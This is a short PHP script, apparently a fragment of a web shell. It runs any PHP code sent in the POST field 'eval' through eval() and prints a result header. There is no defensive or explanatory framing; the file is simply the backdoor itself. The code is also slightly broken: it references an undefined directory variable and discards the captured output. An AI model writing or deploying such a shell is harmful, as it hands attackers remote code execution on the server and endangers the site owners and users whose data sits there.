<?php
$eval = $_POST['eval'];
if (!empty($eval))
{
  echo "<b>Result of execution this PHP-code</b>:<br>";
  $tmp = ob_get_contents();
  $olddir = realpath(".");
  @chdir($d);
  
  ob_clean();
  eval($eval);
  $ret = ob_get_contents();
  $ret = convert_cyr_string($ret,"d","w");
  ob_clean();
  echo $tmp;
  die("");
}  
?>